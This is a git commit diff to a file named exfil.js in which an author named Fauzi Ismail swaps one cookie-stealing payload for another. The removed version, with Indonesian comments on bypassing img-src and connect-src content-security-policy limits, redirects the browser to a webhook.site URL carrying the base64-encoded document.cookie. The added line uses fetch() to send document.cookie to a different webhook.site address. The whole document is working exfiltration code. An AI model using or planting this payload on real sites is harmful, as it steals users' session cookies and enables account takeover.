0292d258c663435fcc5c9e948af338efae459648
Fauzi Ismail <mailvelous.career@gmail.com>
2026-01-15 13:31:47 +0700

    Update exfil.js

--- exfil.js
+++ exfil.js
@@ -1,3 +1,1 @@
-// Menggunakan window.location untuk bypass pembatasan img-src dan connect-src
-// Data akan dikirim sebagai query parameter 'c'
-window.location = "https://webhook.site/b74e2458-abe5-41bf-8319-55fe0e931aeb?c=" + btoa(document.cookie);
+fetch('https://webhook.site/7100915f-b5d8-4cbf-a5fd-269eba2c2e9e?c='+document.cookie)
